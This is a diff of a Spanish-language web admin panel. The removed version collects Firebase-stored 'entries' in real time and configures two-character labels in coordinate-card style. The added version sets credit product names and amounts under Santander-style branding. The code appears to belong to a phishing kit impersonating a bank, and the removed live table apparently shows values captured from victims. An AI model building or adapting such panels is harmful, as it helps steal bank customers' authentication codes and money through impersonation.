@@ -2,95 +2,54 @@
 <html lang="es">
 <head>
   <meta charset="UTF-8">
-  <title>Panel Admin</title>
-  <!-- SDKs de Firebase -->
-  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-auth.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-firestore.js"></script>
-  <script src="firebase.js"></script>
+  <title>Panel de Administración</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="style.css">
 </head>
 <body>
-  <h2>Panel de Administración</h2>
+  <div class="login-box">
+    <h2>Configurar Productos</h2>
 
-  <!-- Login -->
-  <div id="loginDiv">
-    <h3>Iniciar sesión</h3>
-    <input type="email" id="email" placeholder="Correo">
-    <input type="password" id="password" placeholder="Contraseña">
-    <button onclick="login()">Login</button>
-  </div>
+    <form id="adminForm">
+      <label for="producto1">Nombre Producto 1</label>
+      <input type="text" id="producto1" placeholder="Ej: Línea de Crédito">
 
-  <!-- Panel -->
-  <div id="panelDiv" style="display:none;">
-    <button onclick="logout()">Cerrar sesión</button>
+      <label for="monto1">Monto Producto 1</label>
+      <input type="number" id="monto1" placeholder="Ej: 5000000">
 
-    <h3>Configurar etiquetas (solo 2 caracteres alfanuméricos)</h3>
-    <input type="text" id="label1Input" placeholder="Texto para cuadro1">
-    <input type="text" id="label2Input" placeholder="Texto para cuadro2">
-    <input type="text" id="label3Input" placeholder="Texto para cuadro3">
-    <button onclick="guardarConfig()">Guardar Configuración</button>
+      <label for="producto2">Nombre Producto 2</label>
+      <input type="text" id="producto2" placeholder="Ej: Tarjeta de Crédito WorldMember">
 
-    <h3>Entradas en tiempo real</h3>
-    <div id="tablaEntradas"></div>
+      <label for="monto2">Monto Producto 2</label>
+      <input type="number" id="monto2" placeholder="Ej: 7000000">
+
+      <button class="btn-santander" type="submit">
+        Guardar<span class="bg-arrow"></span>
+      </button>
+    </form>
+
+    <div id="resultado"></div>
   </div>
 
   <script>
-    // Login
-    function login(){
-      const email=document.getElementById("email").value;
-      const password=document.getElementById("password").value;
-      auth.signInWithEmailAndPassword(email,password)
-        .then(()=>alert("Login exitoso"))
-        .catch(err=>alert("Error: "+err.message));
-    }
-    function logout(){ auth.signOut(); }
-
-    // Control de sesión
-    auth.onAuthStateChanged(user=>{
-      if(user){
-        document.getElementById("loginDiv").style.display="none";
-        document.getElementById("panelDiv").style.display="block";
-        escucharEntradas();
-      } else {
-        document.getElementById("loginDiv").style.display="block";
-        document.getElementById("panelDiv").style.display="none";
-      }
+    // Cargar valores guardados al abrir el panel
+    document.addEventListener("DOMContentLoaded", () => {
+      document.getElementById("producto1").value = localStorage.getItem("producto1") || "";
+      document.getElementById("monto1").value = localStorage.getItem("lineaMonto") || "";
+      document.getElementById("producto2").value = localStorage.getItem("producto2") || "";
+      document.getElementById("monto2").value = localStorage.getItem("tarjetaMonto") || "";
     });
 
-    // Guardar las 3 etiquetas juntas con validación
-    function guardarConfig(){
-      const l1=document.getElementById("label1Input").value.trim();
-      const l2=document.getElementById("label2Input").value.trim();
-      const l3=document.getElementById("label3Input").value.trim();
+    // Guardar nuevos valores
+    document.getElementById("adminForm").addEventListener("submit", function(e){
+      e.preventDefault();
+      localStorage.setItem("producto1", document.getElementById("producto1").value);
+      localStorage.setItem("lineaMonto", document.getElementById("monto1").value);
+      localStorage.setItem("producto2", document.getElementById("producto2").value);
+      localStorage.setItem("tarjetaMonto", document.getElementById("monto2").value);
 
-      // Validación: solo strings de 2 caracteres alfanuméricos
-      const regex=/^[A-Za-z0-9]{2}$/;
-      if(!regex.test(l1) || !regex.test(l2) || !regex.test(l3)){
-        alert("Cada etiqueta debe ser alfanumérica y de 2 caracteres (ej: A1, B2, C3).");
-        return;
-      }
-
-      db.collection("config").doc("cuadro1").set({label1:l1},{merge:true});
-      db.collection("config").doc("cuadro2").set({label2:l2},{merge:true});
-      db.collection("config").doc("cuadro3").set({label3:l3},{merge:true});
-
-      alert("Configuración guardada");
-    }
-
-    // Escuchar entradas en tiempo real
-    function escucharEntradas(){
-      db.collection("entradas").onSnapshot(snapshot=>{
-        let html="<table border='1'><tr><th>Cuadro</th><th>Campo</th><th>Valor</th></tr>";
-        snapshot.forEach(doc=>{
-          Object.keys(doc.data()).forEach(campo=>{
-            html+=`<tr><td>${doc.id}</td><td>${campo}</td><td>${doc.data()[campo]}</td></tr>`;
-          });
-        });
-        html+="</table>";
-        document.getElementById("tablaEntradas").innerHTML=html;
-      });
-    }
+      document.getElementById("resultado").innerText = "✅ Productos actualizados correctamente.";
+    });
   </script>
 </body>
 </html>
-
